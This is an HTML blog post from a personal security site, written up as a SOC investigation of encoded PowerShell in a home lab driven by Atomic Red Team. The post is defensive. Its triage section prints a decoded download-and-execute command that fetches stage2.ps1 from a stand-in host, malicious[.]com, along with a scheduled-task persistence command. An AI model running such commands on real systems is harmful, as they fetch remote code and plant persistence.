@@ -1,0 +1,700 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Incident Response: PowerShell Threat Detection | ZSec.io</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;700&family=Courier+New&display=swap" rel="stylesheet">
+    <style>
+        * {
+            padding: 0;
+            margin: 0;
+            box-sizing: border-box;
+            text-decoration: none;
+        }
+
+        html {
+            font-size: 20px;
+            font-family: 'Montserrat', sans-serif;
+            scroll-behavior: smooth;
+        }
+
+        body {
+            background: #0a0a0a;
+            overflow-x: hidden;
+            color: #fff;
+        }
+
+        /* Header */
+        .header {
+            width: 100%;
+            height: 100px;
+            background: linear-gradient(135deg, #101010, #1a1a1a);
+            position: fixed;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 20px rgba(0, 255, 65, 0.1);
+            border-bottom: 1px solid rgba(0, 255, 65, 0.2);
+        }
+
+        .inner_header {
+            max-width: 1400px;
+            height: 100%;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 2rem;
+        }
+
+        .logo_container h1 {
+            color: white;
+            font-size: 32px;
+            font-weight: 200;
+        }
+
+        .logo_container h1 span {
+            font-weight: 800;
+            color: #00ff41;
+        }
+
+        .navigation {
+            display: flex;
+            gap: 1rem;
+            list-style: none;
+        }
+
+        .navigation a {
+            padding: 0.5rem 1.5rem;
+            color: white;
+            transition: all 0.3s ease;
+        }
+
+        .navigation a:hover {
+            background: rgba(0, 255, 65, 0.1);
+            color: #00ff41;
+        }
+
+        /* Main Content */
+        .main-content {
+            padding-top: 140px;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding-left: 20px;
+            padding-right: 20px;
+            padding-bottom: 60px;
+        }
+
+        .back-link {
+            display: inline-block;
+            color: #00ff41;
+            margin-bottom: 30px;
+            font-size: 16px;
+            transition: transform 0.3s;
+        }
+
+        .back-link:hover {
+            transform: translateX(-5px);
+        }
+
+        /* Article Header */
+        .article-header {
+            text-align: center;
+            margin-bottom: 60px;
+            padding: 40px 20px;
+            background: linear-gradient(135deg, rgba(255, 50, 50, 0.1), rgba(200, 0, 0, 0.05));
+            border-radius: 15px;
+            border: 2px solid rgba(255, 50, 50, 0.3);
+        }
+
+        .severity-badge {
+            display: inline-block;
+            background: #ff3232;
+            color: #000;
+            padding: 8px 20px;
+            border-radius: 25px;
+            font-size: 0.8rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            margin-bottom: 20px;
+            box-shadow: 0 0 20px rgba(255, 50, 50, 0.5);
+        }
+
+        .article-header h1 {
+            color: #ff3232;
+            font-size: clamp(2rem, 5vw, 3rem);
+            margin-bottom: 15px;
+            text-shadow: 0 0 20px rgba(255, 50, 50, 0.5);
+        }
+
+        .article-meta {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 0.9rem;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        .article-meta span {
+            padding: 5px 15px;
+            background: rgba(0, 255, 65, 0.1);
+            border-radius: 5px;
+        }
+
+        /* Executive Summary */
+        .executive-summary {
+            background: linear-gradient(135deg, rgba(0, 102, 204, 0.15), rgba(0, 102, 204, 0.05));
+            border-left: 4px solid #0066cc;
+            padding: 30px;
+            margin-bottom: 40px;
+            border-radius: 10px;
+        }
+
+        .executive-summary h2 {
+            color: #0066cc;
+            margin-bottom: 15px;
+            font-size: 1.5rem;
+        }
+
+        .executive-summary p {
+            line-height: 1.8;
+            color: rgba(255, 255, 255, 0.9);
+        }
+
+        /* Section Styling */
+        .section {
+            background: linear-gradient(135deg, rgba(22, 33, 62, 0.5), rgba(15, 52, 96, 0.5));
+            border: 2px solid rgba(0, 255, 65, 0.3);
+            border-radius: 15px;
+            padding: 40px;
+            margin-bottom: 40px;
+        }
+
+        .section h2 {
+            color: #00ff41;
+            font-size: 2rem;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid rgba(0, 255, 65, 0.3);
+        }
+
+        .section h3 {
+            color: #00ff41;
+            font-size: 1.4rem;
+            margin-top: 30px;
+            margin-bottom: 15px;
+        }
+
+        .section p, .section li {
+            line-height: 1.8;
+            color: rgba(255, 255, 255, 0.9);
+            margin-bottom: 15px;
+        }
+
+        /* Timeline */
+        .timeline {
+            position: relative;
+            padding-left: 40px;
+            border-left: 3px solid #00ff41;
+            margin: 30px 0;
+        }
+
+        .timeline-item {
+            margin-bottom: 40px;
+            position: relative;
+        }
+
+        .timeline-item::before {
+            content: '';
+            position: absolute;
+            left: -47px;
+            top: 5px;
+            width: 16px;
+            height: 16px;
+            background: #00ff41;
+            border-radius: 50%;
+            border: 3px solid #0a0a0a;
+            box-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
+        }
+
+        .timestamp {
+            color: #00ff41;
+            font-size: 0.85rem;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+
+        .timeline-item h4 {
+            color: #fff;
+            font-size: 1.2rem;
+            margin-bottom: 10px;
+        }
+
+        /* Code Blocks */
+        .code-block {
+            background: rgba(0, 0, 0, 0.7);
+            border-left: 4px solid #00ff41;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+            overflow-x: auto;
+        }
+
+        .code-block pre {
+            color: #00ff41;
+            line-height: 1.6;
+        }
+
+        /* Alert Boxes */
+        .alert-box {
+            background: rgba(255, 50, 50, 0.1);
+            border-left: 4px solid #ff3232;
+            padding: 25px;
+            margin: 30px 0;
+            border-radius: 8px;
+        }
+
+        .alert-box strong {
+            color: #ff3232;
+            font-size: 1.2rem;
+            display: block;
+            margin-bottom: 10px;
+        }
+
+        .info-box {
+            background: rgba(0, 102, 204, 0.1);
+            border-left: 4px solid #0066cc;
+            padding: 25px;
+            margin: 30px 0;
+            border-radius: 8px;
+        }
+
+        .info-box strong {
+            color: #0066cc;
+            font-size: 1.2rem;
+            display: block;
+            margin-bottom: 10px;
+        }
+
+        .success-box {
+            background: rgba(0, 255, 65, 0.1);
+            border-left: 4px solid #00ff41;
+            padding: 25px;
+            margin: 30px 0;
+            border-radius: 8px;
+        }
+
+        .success-box strong {
+            color: #00ff41;
+            font-size: 1.2rem;
+            display: block;
+            margin-bottom: 10px;
+        }
+
+        /* MITRE ATT&CK */
+        .mitre-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+
+        .mitre-card {
+            background: rgba(255, 50, 50, 0.1);
+            border: 2px solid rgba(255, 50, 50, 0.3);
+            padding: 20px;
+            border-radius: 10px;
+            transition: all 0.3s ease;
+        }
+
+        .mitre-card:hover {
+            border-color: #ff3232;
+            transform: translateY(-5px);
+            box-shadow: 0 5px 20px rgba(255, 50, 50, 0.3);
+        }
+
+        .mitre-card h4 {
+            color: #ff3232;
+            margin-bottom: 10px;
+            font-size: 1.1rem;
+        }
+
+        .technique-id {
+            color: #00ff41;
+            font-family: monospace;
+            font-size: 0.9rem;
+        }
+
+        /* Stats Grid */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+
+        .stat-card {
+            background: rgba(0, 255, 65, 0.1);
+            border: 2px solid rgba(0, 255, 65, 0.3);
+            padding: 25px;
+            border-radius: 10px;
+            text-align: center;
+        }
+
+        .stat-number {
+            font-size: 2.5rem;
+            color: #00ff41;
+            font-weight: bold;
+            display: block;
+            margin-bottom: 10px;
+        }
+
+        .stat-label {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 0.9rem;
+        }
+
+        /* Lists */
+        ul {
+            list-style: none;
+            padding-left: 0;
+        }
+
+        li {
+            padding-left: 25px;
+            position: relative;
+            margin-bottom: 12px;
+        }
+
+        li::before {
+            content: '▹';
+            color: #00ff41;
+            position: absolute;
+            left: 0;
+            font-weight: bold;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .main-content {
+                padding-top: 100px;
+            }
+
+            .article-header h1 {
+                font-size: 2rem;
+            }
+
+            .section {
+                padding: 25px;
+            }
+
+            .timeline {
+                padding-left: 25px;
+            }
+
+            .stats-grid, .mitre-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <div class="header">
+        <div class="inner_header">
+            <div class="logo_container">
+                <h1>Z<span>Sec.io</span></h1>
+            </div>
+            <ul class="navigation">
+                <a href="../index.html"><li>Home</li></a>
+                <a href="../index.html#projects"><li>Projects</li></a>
+                <a href="Blog.html"><li>Blog</li></a>
+                <a href="Contact.html"><li>Contact</li></a>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="main-content">
+        <a href="Blog.html" class="back-link">← Back to Blog</a>
+
+        <!-- Article Header -->
+        <div class="article-header">
+            <span class="severity-badge">🚨 HIGH SEVERITY INCIDENT</span>
+            <h1>Detecting Suspicious PowerShell Activity: A Real SOC Investigation</h1>
+            <div class="article-meta">
+                <span>📅 December 2024</span>
+                <span>⏱️ 8 min read</span>
+                <span>🎯 MITRE ATT&CK</span>
+                <span>🔍 Threat Detection</span>
+            </div>
+        </div>
+
+        <!-- Executive Summary -->
+        <div class="executive-summary">
+            <h2>📋 Executive Summary</h2>
+            <p>
+                On December 10, 2024, my home Mini-SOC detected encoded PowerShell execution attempting to download a remote payload and establish persistence. This writeup documents the complete investigation from initial alert through containment, demonstrating real-world SOC analyst workflows including log correlation, threat intelligence enrichment, and incident response procedures.
+            </p>
+        </div>
+
+        <!-- Key Metrics -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <span class="stat-number">2m 15s</span>
+                <span class="stat-label">Time to Detection</span>
+            </div>
+            <div class="stat-card">
+                <span class="stat-number">42 min</span>
+                <span class="stat-label">Time to Containment</span>
+            </div>
+            <div class="stat-card">
+                <span class="stat-number">4</span>
+                <span class="stat-label">MITRE Techniques</span>
+            </div>
+            <div class="stat-card">
+                <span class="stat-number">100%</span>
+                <span class="stat-label">IOCs Documented</span>
+            </div>
+        </div>
+
+        <!-- Detection -->
+        <div class="section">
+            <h2>🔍 Initial Detection</h2>
+            
+            <h3>How It Started</h3>
+            <p>
+                While reviewing my Splunk dashboard during routine monitoring, I noticed an unusual spike in alerts. My Wazuh agent triggered a high-severity alert for encoded PowerShell execution on my Windows 10 lab VM.
+            </p>
+
+            <div class="alert-box">
+                <strong>⚠️ Initial Alert</strong>
+                <div class="code-block">
+                    <pre>Rule ID: 91816 - PowerShell encoded command detected
+Severity: High (Level 12)
+Host: WIN-LAB-01 (192.168.1.150)
+User: labuser
+Timestamp: 2024-12-10 14:23:17 EST
+
+Command Line:
+powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...</pre>
+                </div>
+            </div>
+
+            <h3>Why This Matters</h3>
+            <p>
+                Encoded PowerShell commands are a massive red flag in SOC operations. Attackers use Base64 encoding to:
+            </p>
+            <ul>
+                <li>Evade basic string-based detection rules</li>
+                <li>Hide malicious payloads from event logs</li>
+                <li>Bypass application whitelisting</li>
+                <li>Execute fileless malware attacks</li>
+            </ul>
+
+            <p>
+                In my experience monitoring the Mini-SOC, I've seen legitimate PowerShell scripts, but <strong>encoded commands are almost always malicious</strong>.
+            </p>
+        </div>
+
+        <!-- Investigation -->
+        <div class="section">
+            <h2>🕵️ Investigation Process</h2>
+
+            <div class="timeline">
+                <div class="timeline-item">
+                    <div class="timestamp">T+0:00 | Initial Alert</div>
+                    <h4>Alert Received & Triage</h4>
+                    <p>
+                        Wazuh alert appeared in Splunk dashboard. I immediately stopped what I was doing and began triage. First step: decode the Base64 string to see what we're dealing with.
+                    </p>
+                    <div class="code-block">
+                        <pre># PowerShell one-liner to decode
+[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SQBFAFgAIAAo..."))
+
+# Result (cleaned):
+IEX (New-Object Net.WebClient).DownloadString('http://malicious[.]com/stage2.ps1')
+schtasks /create /tn "SystemUpdate" /tr "powershell -File C:\Users\Public\update.ps1" /sc onlogon</pre>
+                    </div>
+                    <p><strong>My assessment:</strong> This is attempting to download a second-stage payload AND create persistence via scheduled task. Definitely malicious.</p>
+                </div>
+
+                <div class="timeline-item">
+                    <div class="timestamp">T+0:05 | Log Correlation</div>
+                    <h4>Correlated Events Across Systems</h4>
+                    <p>
+                        Jumped into Splunk to find related events. I ran this search to correlate Wazuh alerts with network traffic:
+                    </p>
+                    <div class="code-block">
+                        <pre>index=suricata OR index=wazuh host="WIN-LAB-01"
+| eval _time=strptime(timestamp, "%Y-%m-%dT%H:%M:%S")
+| sort _time
+| table _time, src_ip, dest_ip, dest_port, alert.signature, full_log</pre>
+                    </div>
+                    <p><strong>Key Findings:</strong></p>
+                    <ul>
+                        <li>3 additional PowerShell executions in 2-minute window</li>
+                        <li>Suricata detected HTTP connection to 185.220.101.42 (suspicious IP)</li>
+                        <li>Scheduled task creation logged in Windows Event ID 4698</li>
+                    </ul>
+                </div>
+
+                <div class="timeline-item">
+                    <div class="timestamp">T+0:12 | Threat Intelligence</div>
+                    <h4>IOC Enrichment</h4>
+                    <p>
+                        Checked the destination IP using my automated threat intel bot (CyberOps Sidekick):
+                    </p>
+                    <div class="alert-box">
+                        <strong>Threat Intel Results</strong>
+                        <ul style="margin-top: 15px;">
+                            <li><strong>AbuseIPDB:</strong> Score 100/100 (reported 47 times)</li>
+                            <li><strong>VirusTotal:</strong> 8/92 vendors flagged as malicious</li>
+                            <li><strong>AlienVault OTX:</strong> Associated with commodity malware campaigns</li>
+                            <li><strong>Domain Age:</strong> Registered 3 days ago (major red flag)</li>
+                        </ul>
+                    </div>
+                    <p>This confirmed malicious intent - not a false positive.</p>
+                </div>
+
+                <div class="timeline-item">
+                    <div class="timestamp">T+0:25 | Host Forensics</div>
+                    <h4>Deep Dive into Endpoint</h4>
+                    <p>
+                        Analyzed Windows Event Logs and Sysmon data to build the complete attack timeline:
+                    </p>
+                    <ul>
+                        <li><strong>Event ID 4688:</strong> Process creation for powershell.exe (parent: cmd.exe)</li>
+                        <li><strong>Sysmon Event ID 1:</strong> Full command line captured</li>
+                        <li><strong>Event ID 4698:</strong> Scheduled task "SystemUpdate" created</li>
+                        <li><strong>File Creation:</strong> C:\Users\Public\update.ps1 written to disk</li>
+                    </ul>
+                    <p>
+                        <strong>Process Tree Analysis:</strong> The PowerShell was spawned from a user-initiated cmd.exe, which makes sense since this was a controlled lab test using Atomic Red Team.
+                    </p>
+                </div>
+
+                <div class="timeline-item">
+                    <div class="timestamp">T+0:42 | Containment</div>
+                    <h4>Threat Contained</h4>
+                    <p>
+                        Took immediate action to stop the threat:
+                    </p>
+                    <ol style="list-style: decimal; padding-left: 40px;">
+                        <li>Isolated host from network (firewall block all egress except DNS)</li>
+                        <li>Terminated malicious powershell.exe process (PID 4892)</li>
+                        <li>Deleted C:\Users\Public\update.ps1</li>
+                        <li>Removed scheduled task "SystemUpdate"</li>
+                        <li>Collected forensic evidence (memory dump, logs, registry)</li>
+                    </ol>
+                </div>
+            </div>
+        </div>
+
+        <!-- MITRE ATT&CK -->
+        <div class="section">
+            <h2>🎯 MITRE ATT&CK Mapping</h2>
+            <p>
+                I mapped the observed behaviors to the MITRE ATT&CK framework for standardized threat classification:
+            </p>
+
+            <div class="mitre-grid">
+                <div class="mitre-card">
+                    <h4>Execution</h4>
+                    <p class="technique-id">T1059.001 - PowerShell</p>
+                    <p>Attacker used PowerShell to execute encoded malicious commands.</p>
+                </div>
+
+                <div class="mitre-card">
+                    <h4>Defense Evasion</h4>
+                    <p class="technique-id">T1027 - Obfuscated Files</p>
+                    <p>Base64 encoding used to hide command content from detection systems.</p>
+                </div>
+
+                <div class="mitre-card">
+                    <h4>Persistence</h4>
+                    <p class="technique-id">T1053.005 - Scheduled Task</p>
+                    <p>Created "SystemUpdate" task to maintain access after reboot.</p>
+                </div>
+
+                <div class="mitre-card">
+                    <h4>Command & Control</h4>
+                    <p class="technique-id">T1105 - Ingress Tool Transfer</p>
+                    <p>Attempted to download second-stage payload from remote server.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Lessons Learned -->
+        <div class="section">
+            <h2>📚 What I Learned</h2>
+
+            <h3>What Worked Well ✅</h3>
+            <ul>
+                <li><strong>Detection was fast:</strong> Wazuh caught it within seconds, alerting me before the payload could execute</li>
+                <li><strong>Log correlation saved time:</strong> Having Wazuh + Suricata + Sysmon in Splunk let me build the complete picture quickly</li>
+                <li><strong>Threat intel automation:</strong> My CyberOps Sidekick bot provided instant context without manual lookups</li>
+                <li><strong>Documentation:</strong> I maintained detailed notes throughout, making this writeup much easier</li>
+            </ul>
+
+            <h3>Areas for Improvement 🔧</h3>
+            <ul>
+                <li><strong>Alert triage speed:</strong> Took 5 minutes to decode the PowerShell - I should automate this with a Splunk saved search</li>
+                <li><strong>Playbook gaps:</strong> No pre-built response playbook for encoded PowerShell - had to improvise</li>
+                <li><strong>Containment delay:</strong> Manual isolation took 15+ minutes - need SOAR integration for instant response</li>
+            </ul>
+
+            <h3>Immediate Actions Taken</h3>
+            <div class="success-box">
+                <strong>✅ Improvements Implemented</strong>
+                <ul style="margin-top: 15px;">
+                    <li>Created Splunk alert to auto-decode Base64 PowerShell commands</li>
+                    <li>Built custom Suricata rule for encoded PowerShell patterns</li>
+                    <li>Documented incident response playbook for similar scenarios</li>
+                    <li>Added automated threat intel queries to alert workflow</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Conclusion -->
+        <div class="section">
+            <h2>✅ Conclusion</h2>
+            <p>
+                This investigation demonstrated the value of having a properly configured home SOC environment. The detection worked as intended, catching a sophisticated attack technique (encoded PowerShell + scheduled task persistence) that would bypass basic antivirus.
+            </p>
+
+            <div class="info-box">
+                <strong>💡 Key Takeaway</strong>
+                <p>
+                    <strong>Context is everything in SOC work.</strong> The initial alert was just one line in the logs, but by correlating data from three different sources (HIDS, IDS, Windows logs) and enriching with threat intelligence, I was able to build a complete picture of the attack chain and respond effectively.
+                </p>
+            </div>
+
+            <p>
+                While this was a controlled test using Atomic Red Team, I followed production SOC procedures throughout. The investigation methodology, documentation standards, and response actions are identical to what I'd do in a real enterprise environment.
+            </p>
+
+            <h3>Skills Demonstrated</h3>
+            <ul>
+                <li><strong>Alert Triage:</strong> Quickly assessed severity and prioritized investigation</li>
+                <li><strong>Decoding/Analysis:</strong> Decoded obfuscated commands to reveal intent</li>
+                <li><strong>Log Correlation:</strong> Combined data from multiple sources for full visibility</li>
+                <li><strong>Threat Intelligence:</strong> Enriched IOCs with external reputation data</li>
+                <li><strong>Incident Response:</strong> Followed structured containment procedures</li>
+                <li><strong>MITRE ATT&CK:</strong> Mapped behaviors to standardized framework</li>
+                <li><strong>Continuous Improvement:</strong> Identified gaps and implemented fixes</li>
+            </ul>
+        </div>
+
+        <div style="text-align: center; margin-top: 50px; padding: 40px; background: linear-gradient(135deg, rgba(22, 33, 62, 0.7), rgba(15, 52, 96, 0.7)); border-radius: 15px;">
+            <p style="font-size: 1.2rem; margin-bottom: 20px; color: rgba(255, 255, 255, 0.9);">
+                Want to discuss this investigation or see more of my SOC work?
+            </p>
+            <a href="Contact.html" style="display: inline-block; background: #00ff41; color: #000; padding: 15px 40px; border-radius: 10px; font-weight: bold; font-size: 1.1rem; transition: all 0.3s ease;">Get In Touch</a>
+        </div>
+    </div>
+</body>
+</html>
